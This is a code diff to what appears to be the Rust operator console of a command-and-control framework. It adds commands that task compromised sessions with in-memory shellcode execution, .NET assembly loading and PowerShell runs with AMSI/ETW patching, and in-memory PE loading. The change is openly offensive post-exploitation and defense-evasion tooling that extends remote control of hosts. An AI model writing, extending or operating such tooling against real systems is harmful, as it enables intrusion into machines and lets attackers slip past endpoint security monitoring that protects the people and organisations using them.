@@ -94,7 +94,22 @@ impl App {
                 self.push_log("  sessions                        refresh session list".into());
                 self.push_log("  shell <id> <command...>         run command on session".into());
                 self.push_log(
-                    "  module <id> <name> [args...]     in-process module (ps/ls/cat/whoami)"
+                    "  module <id> <name> [args...]     in-process module (ps/ls/cat/whoami/netstat/env)"
+                        .into(),
+                );
+                self.push_log(
+                    "  exec <id> <local-file>          in-process shellcode execution (ABR-T022)"
+                        .into(),
+                );
+                self.push_log(
+                    "  execasm <id> <file> [type method arg]  .NET assembly in-process + AMSI/ETW patch (T024/T025)"
+                        .into(),
+                );
+                self.push_log(
+                    "  psrun <id> <script or local .ps1>     in-process PowerShell, AMSI/ETW patched (T026)".into(),
+                );
+                self.push_log(
+                    "  runpe <id> <local .exe/.dll | staged path>  native PE in-memory (T027)"
                         .into(),
                 );
                 self.push_log(
@@ -143,6 +158,42 @@ impl App {
                 let name = tokens[2].to_string();
                 let args = tokens[3..].join(" ");
                 Some(json!({ "cmd": "module", "session": id, "name": name, "args": args }))
+            }
+            Some("exec") if tokens.len() >= 4 => {
+                let id: u32 = tokens[1].parse().unwrap_or(0);
+                Some(json!({ "cmd": "exec", "session": id, "source": tokens[3] }))
+            }
+            Some("runpe") if tokens.len() >= 4 => {
+                let id: u32 = tokens[1].parse().unwrap_or(0);
+                let rest = tokens[3..].join(" ");
+                let key = if std::path::Path::new(&rest).is_file() {
+                    "source"
+                } else {
+                    "path"
+                };
+                Some(json!({ "cmd": "runpe", "session": id, key: rest }))
+            }
+            Some("psrun") if tokens.len() >= 3 => {
+                let id: u32 = tokens[1].parse().unwrap_or(0);
+                let rest = tokens[2..].join(" ");
+                // A local .ps1 on the teamserver host becomes "source";
+                // anything else is the inline script.
+                let key = if std::path::Path::new(&rest).is_file() {
+                    "source"
+                } else {
+                    "script"
+                };
+                Some(json!({ "cmd": "psrun", "session": id, key: rest }))
+            }
+            Some("execasm") if tokens.len() >= 4 => {
+                let id: u32 = tokens[1].parse().unwrap_or(0);
+                Some(json!({
+                    "cmd": "execasm", "session": id, "source": tokens[3],
+                    "type": tokens.get(4).copied().unwrap_or("Prog"),
+                    "method": tokens.get(5).copied().unwrap_or("Go"),
+                    "argument": tokens.get(6).copied().unwrap_or(""),
+                    "patch": true
+                }))
             }
             Some("driver") if tokens.len() == 6 && tokens[2] == "load" => {
                 let id: u32 = tokens[1].parse().unwrap_or(0);
